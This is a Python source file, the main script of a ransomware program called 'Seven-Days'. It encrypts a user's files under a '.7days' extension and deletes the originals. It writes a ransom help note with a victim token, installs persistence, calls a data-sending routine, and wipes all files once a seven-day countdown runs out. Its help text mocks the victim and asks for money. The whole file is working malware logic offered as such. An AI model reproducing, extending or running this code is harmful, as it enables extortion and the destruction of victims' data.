#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
 _______  _______           _______  _               ______   _______           _______
(  ____ \(  ____ \|\     /|(  ____ \( (    /|       (  __  \ (  ___  )|\     /|(  ____ \
| (    \/| (    \/| )   ( || (    \/|  \  ( |       | (  \  )| (   ) |( \   / )| (    \/
| (_____ | (__    | |   | || (__    |   \ | | _____ | |   ) || (___) | \ (_) / | (_____
(_____  )|  __)   ( (   ) )|  __)   | (\ \) |(_____)| |   | ||  ___  |  \   /  (_____  )
      ) || (       \ \_/ / | (      | | \   |       | |   ) || (   ) |   ) (         ) |
/\____) || (____/\  \   /  | (____/\| )  \  |       | (__/  )| )   ( |   | |   /\____) |
\_______)(_______/   \_/   (_______/|/    )_)       (______/ |/     \|   \_/   \_______)

'''
import os, sys, argparse, time
from target.target import Target
#from interface.interface import Interface

# Variables de configuration
encrypt_ext_name = '.7days'
__home__ = os.path.expanduser("~")

# Parsing des arguments
parser = argparse.ArgumentParser(description='You have seven days')
parser.add_argument('-e','--encryption', help='Destroy yourself', action="store_true")
parser.add_argument('-d','--decryption', help='Enjoy yourself', action="store_true")
parser.add_argument('-k','--key', help='Money ? Nice !')
parser.add_argument('-f','--file', help='A .json please !')
parser.add_argument('-s','--seven', help=argparse.SUPPRESS, action="store_true")
parser.add_argument('-t','--timer', help=argparse.SUPPRESS, action="store_true")
args = parser.parse_args()

gui = False
encryption = False
decryption = False
seven = False
timer = False
if(len(sys.argv) < 2):
    gui = True
if(args.encryption):
    encryption = True
if(args.timer):
    timer = True
if(args.seven):
    seven = True
if(args.decryption):
    decryption = True
if(args.key):
    decryption_key = args.key
if(args.file):
    target_data_json = args.file


def main():
    global encryption
    global decryption
    global decryption_key
    global gui
    global encrypt_ext_name
    global seven
    global timer

    if seven is True:
        target = Target()
        target.create_initial_time()
        while True:
            time.sleep(1)
            begin_time = float(target.watch_time())
            current_time = float(time.time())
            gameover = 604800
            if(current_time - begin_time > gameover):
                target.delete_all_files()
                sys.exit(1)
    # Par soucis de performances, nous importons les modules seulement si besoin est.
    if timer is True:
        from interface.interface import Interface
        interface = Interface()
        interface.time_left()
    if gui is True:
        # Si le script est lancé sans arguments, nous affichons l'interface graphique
        from interface.interface import Interface
        interface = Interface()
        interface.create_window()

    if encryption is True:
        # Si l'argument -e est envoyé, nous lançons le chiffrement des données
        from encrypter.encryption import Encryption

        # Nous préparons le chemin ou le script sera installé
        target = Target()
        target.prepare_folder()


        main_drive = __home__+r"\testing_sevendays"

        # drives = target.get_drives()
        # main_drives = ["".join("c:\\") if "c" in drives else drives[0]]
        # main_drive = "".join(main_drives)

        # Nous renommons les fichiers que nous voulons chiffrer.
        target.renaming_files(main_drive)
        targeted_files = target.renamed_files(main_drive, encryption=True)

        encryption = Encryption()
        key = encryption.key_gen()
        for tfile in targeted_files:
            try:
                if("User_Data" in tfile):
                    pass
                else:
                    encryption.encrypt_file(key, tfile, encrypt_ext_name)
                    os.remove(tfile)
            except:
                pass

        target_token = target.token_gen()
        target.save_token(target_token)
        try:
            target.create_help(target_token)
        except:
            pass
        target.create_shortcut()
        time.sleep(1)
        target.create_persistence2()

        target.send_data()
        target.torkill()
        target.clean_up()
        target.create_persistence()
        target.create_initial_time()
        while True:
            time.sleep(1)
            begin_time = float(target.watch_time())
            current_time = float(time.time())
            gameover = 604800
            if(round(current_time - begin_time) == gameover):
                target.delete_all_files()
                sys.exit(1)

    if decryption is True:
        from decrypter.decrypter import Decryption
        target = Target()
        decryption = Decryption()
        if(target_data_json):
            infected_files = target.renamed_files(target_data_json)
            decryption_key = target.get_key(target_data_json)

            for ifile in infected_files:
                decryption.decrypt_file(decryption_key, ifile)

if __name__ == '__main__':
    main()
